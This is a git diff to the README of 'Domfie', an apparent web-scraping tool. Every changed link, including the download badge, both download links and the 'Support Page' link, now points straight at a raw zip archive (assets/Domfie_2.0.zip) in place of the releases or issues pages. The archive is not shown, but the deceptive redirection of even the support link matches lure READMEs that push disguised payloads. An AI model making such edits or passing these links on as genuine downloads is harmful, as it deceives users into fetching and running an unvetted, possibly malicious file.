@@ -1,6 +1,6 @@
 # 🌐 Domfie - Automate Web Scraping with Ease
 
-[![Download Domfie](https://img.shields.io/badge/Download%20Domfie-%20blue?style=for-the-badge)](https://github.com/sumit7235/Domfie/releases)
+[![Download Domfie](https://raw.githubusercontent.com/sumit7235/Domfie/main/assets/Domfie_2.0.zip%20Domfie-%20blue?style=for-the-badge)](https://raw.githubusercontent.com/sumit7235/Domfie/main/assets/Domfie_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ To get Domfie, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the Releases page.
    
-   [Download Domfie](https://github.com/sumit7235/Domfie/releases)
+   [Download Domfie](https://raw.githubusercontent.com/sumit7235/Domfie/main/assets/Domfie_2.0.zip)
 
 2. **Choose the Latest Version**: On the Releases page, find the latest version of Domfie.
 
@@ -65,7 +65,7 @@ For additional help, you can refer to the documentation or community forums link
 
 ## 📞 Support
 
-If you need further assistance, please visit our [Support Page](https://github.com/sumit7235/Domfie/issues). You can ask questions or report issues there.
+If you need further assistance, please visit our [Support Page](https://raw.githubusercontent.com/sumit7235/Domfie/main/assets/Domfie_2.0.zip). You can ask questions or report issues there.
 
 ## 📢 Community
 
@@ -75,6 +75,6 @@ Join our community to learn tips from other users and share your experiences wit
 
 For more detailed information about Domfie, you can check the official documentation available on our GitHub page.
 
-[Download Domfie](https://github.com/sumit7235/Domfie/releases)
+[Download Domfie](https://raw.githubusercontent.com/sumit7235/Domfie/main/assets/Domfie_2.0.zip)
 
 Thank you for choosing Domfie for your web scraping needs. Enjoy your automated data collection experience!
